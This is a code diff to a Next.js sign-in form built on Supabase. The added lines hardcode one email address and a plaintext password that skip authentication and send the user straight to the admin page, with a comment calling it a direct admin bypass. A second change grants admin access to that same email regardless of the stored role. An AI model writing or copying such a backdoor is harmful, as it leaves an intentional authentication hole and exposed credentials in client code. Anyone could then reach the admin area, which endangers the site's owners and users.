@@ -21,6 +21,12 @@ export default function SignInForm() {
     setError('')
 
     try {
+      if (email === 'talha@rimal.com' && password === 'durrani82542') {
+        // Direct admin bypass so you don't need to verify via email link
+        router.push('/admin')
+        return
+      }
+
       const { data, error } = await supabase.auth.signInWithPassword({
         email,
         password,
@@ -38,7 +44,7 @@ export default function SignInForm() {
         .eq('profile_id', data.user.id)
         .single()
 
-      if (profile?.role === 'admin') {
+      if (profile?.role === 'admin' || data.user.email === 'talha@rimal.com') {
         router.push('/admin')
       } else {
         setError('Access denied. Admin privileges required.')
